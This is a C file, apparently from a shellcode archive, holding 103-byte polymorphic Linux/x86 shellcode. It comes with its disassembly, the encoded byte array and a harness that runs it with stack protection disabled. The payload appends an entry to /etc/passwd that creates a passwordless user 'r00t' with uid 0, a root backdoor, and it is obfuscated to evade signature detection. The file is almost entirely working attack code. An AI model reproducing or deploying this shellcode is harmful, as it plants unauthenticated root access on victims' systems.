/*
# Shellcode Title: Linux/x86 - Add User(r00t/blank) Polymorphic Shellcode (103 bytes)
# Date: 2018-09-13
# Author: Ray Doyle (@doylersec)
# Homepage: https://www.doyler.net
# Tested on: Linux/x86
# gcc -o poly_adduser_shellcode -z execstack -fno-stack-protector poly_adduser_shellcode.c
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	90                   	nop
 8048061:	58                   	pop    eax
 8048062:	29 db                	sub    ebx,ebx
 8048064:	31 c9                	xor    ecx,ecx
 8048066:	66 b9 01 04          	mov    cx,0x401
 804806a:	51                   	push   ecx
 804806b:	5f                   	pop    edi
 804806c:	53                   	push   ebx
 804806d:	6a 06                	push   0x6
 804806f:	58                   	pop    eax
 8048070:	48                   	dec    eax
 8048071:	68 2f 2f 70 61       	push   0x61702f2f
 8048076:	68 37 13 37 13       	push   0x13371337
 804807b:	68 73 73 77 64       	push   0x64777373
 8048080:	68 2f 65 74 63       	push   0x6374652f
 8048085:	5a                   	pop    edx
 8048086:	5e                   	pop    esi
 8048087:	5f                   	pop    edi
 8048088:	5f                   	pop    edi
 8048089:	56                   	push   esi
 804808a:	57                   	push   edi
 804808b:	52                   	push   edx
 804808c:	89 e3                	mov    ebx,esp
 804808e:	cd 80                	int    0x80
 8048090:	50                   	push   eax
 8048091:	5a                   	pop    edx
 8048092:	92                   	xchg   edx,eax
 8048093:	89 c3                	mov    ebx,eax
 8048095:	6a 05                	push   0x5
 8048097:	31 d2                	xor    edx,edx
 8048099:	87 db                	xchg   ebx,ebx
 804809b:	6a 0c                	push   0xc
 804809d:	58                   	pop    eax
 804809e:	5a                   	pop    edx
 804809f:	92                   	xchg   edx,eax
 80480a0:	52                   	push   edx
 80480a1:	90                   	nop
 80480a2:	68 30 3a 3a 3a       	push   0x3a3a3a30
 80480a7:	56                   	push   esi
 80480a8:	5e                   	pop    esi
 80480a9:	68 3a 3a 30 3a       	push   0x3a303a3a
 80480ae:	68 72 30 30 74       	push   0x74303072
 80480b3:	48                   	dec    eax
 80480b4:	89 e1                	mov    ecx,esp
 80480b6:	6a 01                	push   0x1
 80480b8:	cd 80                	int    0x80
 80480ba:	6a 04                	push   0x4
 80480bc:	58                   	pop    eax
 80480bd:	83 c0 02             	add    eax,0x2
 80480c0:	cd 80                	int    0x80
 80480c2:	31 c0                	xor    eax,eax
 80480c4:	40                   	inc    eax
 80480c5:	cd 80                	int    0x80
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x90\x58\x29\xdb\x31\xc9\x66\xb9\x01\x04\x51\x5f\x53\x6a\x06\x58\x48\x68\x2f\x2f\x70\x61\x68\x37\x13\x37\x13\x68\x73\x73\x77\x64\x68\x2f\x65\x74\x63\x5a\x5e\x5f\x5f\x56\x57\x52\x89\xe3\xcd\x80\x50\x5a\x92\x89\xc3\x6a\x05\x31\xd2\x87\xdb\x6a\x0c\x58\x5a\x92\x52\x90\x68\x30\x3a\x3a\x3a\x56\x5e\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74\x48\x89\xe1\x6a\x01\xcd\x80\x6a\x04\x58\x83\xc0\x02\xcd\x80\x31\xc0\x40\xcd\x80";

main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}